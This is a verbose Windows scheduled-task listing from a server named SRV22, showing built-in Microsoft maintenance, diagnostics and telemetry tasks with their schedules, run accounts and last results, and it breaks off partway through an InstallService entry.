HostName:                             SRV22
TaskName:                             \Microsoft\Windows\BrokerInfrastructure\BgTaskRegistrationMaintenanceTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          268435456
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Maintains registrations for background tasks for Universal Windows Platform applications.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for 0 minutes, If Not Idle Retry For 0 minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Chkdsk
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Chkdsk\ProactiveScan
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              NTFS Volume Health Scan
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Chkdsk\SyspartRepair
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\system32\bcdboot.exe %windir% /sysrepair
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\CloudExperienceHost
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Customer Experience Improvement Program
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
Next Run Time:                        1/10/2026 6:00:00 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:00:00 PM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %SystemRoot%\System32\wsqmcons.exe
Start In:                             N/A
Comment:                              If the user has consented to participate in the Windows Customer Experience Improvement Program, this job collects and sends usage data to Microsoft.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           12:00:00 AM
Start Date:                           1/2/2004
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        6 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              The USB CEIP (Customer Experience Improvement Program) task collects Universal Serial Bus related statistics and information about your machine and sends it to the Windows Device Connectivity engineering group at Microsoft.  The information received is
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Data Integrity Scan
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Next Run Time:                        1/15/2026 2:51:03 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:00 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Scans fault-tolerant volumes for latent corruptions
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Weekly
Start Time:                           11:00:00 PM
Start Date:                           1/1/2011
End Date:                             N/A
Days:                                 SAT
Months:                               Every 4 week(s)
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Next Run Time:                        1/11/2026 6:31:50 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:00 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Scans fault-tolerant volumes for latent corruptions
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Scans fault-tolerant volumes for fast crash recovery
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Defrag
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Defrag\ScheduledDefrag
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\defrag.exe -c -h -k -g -$
Start In:                             N/A
Comment:                              This task optimizes local storage drives.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Device Information
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Device Information\Device
Next Run Time:                        1/11/2026 4:35:11 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 4:17:00 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\devicecensus.exe
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           3:00:00 AM
Start Date:                           9/1/2008
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Device Information\Device
Next Run Time:                        1/11/2026 4:13:10 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 4:17:00 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\devicecensus.exe
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Diagnosis
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Diagnosis\Scheduled
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              The Windows Scheduled Maintenance Task performs periodic maintenance of the computer system by fixing problems automatically or reporting them through Security and Maintenance.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\DirectX
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\DirectX\DXGIAdapterCache
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:23:58 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\dxgiadaptercache.exe
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\DirectX\DXGIAdapterCache
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:23:58 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\dxgiadaptercache.exe
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\DiskCleanup
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\DiskCleanup\SilentCleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 1:31:51 PM
Last Result:                          -2147020576
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
Start In:                             N/A
Comment:                              Maintenance task used by the system to launch a silent auto disk cleanup when running low on free disk space.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:15:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\DiskDiagnostic
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART
Start In:                             N/A
Comment:                              The Windows Disk Diagnostic reports general disk and system information to Microsoft for users participating in the Customer Experience Program.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\DFDWiz.exe
Start In:                             N/A
Comment:                              The Microsoft-Windows-DiskDiagnosticResolver warns users about faults reported by hard disks that support the Self Monitoring and Reporting Technology (S.M.A.R.T.) standard. This task is triggered automatically by the Diagnostic Policy Service when a S.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\DiskFootprint
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\DiskFootprint\Diagnostics
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\disksnapshot.exe -z
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\DiskFootprint\StorageSense
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\EDP
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\EDP\EDP App Launch Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\EDP\EDP Auth Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\EDP\EDP Inaccessible Credentials Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\EDP\StorageCardEncryption Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\ExploitGuard
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:23:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Task for applying changes to the machine's Exploit Protection settings.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:23:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Task for applying changes to the machine's Exploit Protection settings.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:23:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Task for applying changes to the machine's Exploit Protection settings.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\File Classification Infrastructure
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\File Classification Infrastructure\Property Definition Sync
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Synchronizes the File Classification Infrastructure taxonomy on the computer with the resource property definitions stored in Active Directory Domain Services.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 1 minutes
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily
Start Time:                           3:00:00 AM
Start Date:                           11/9/2006
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\Flighting
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Flighting\FeatureConfig
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Flighting\FeatureConfig\ReconcileFeatures
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 1:06:46 PM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Task periodically reconciling feature configurations
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Flighting\OneSettings
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Flighting\OneSettings\RefreshCache
Next Run Time:                        1/11/2026 12:05:09 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:13 AM
Last Result:                          -2147020576
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Task periodically refreshing data for OneSettings clients.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           12:00:00 AM
Start Date:                           1/1/2018
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\InstallService
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\InstallService\ScanForUpdates
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 10:16:11 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           4:00:00 PM
Start Date:                           12/31/2013
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\InstallService\ScanForUpdates
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 10:16:11 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
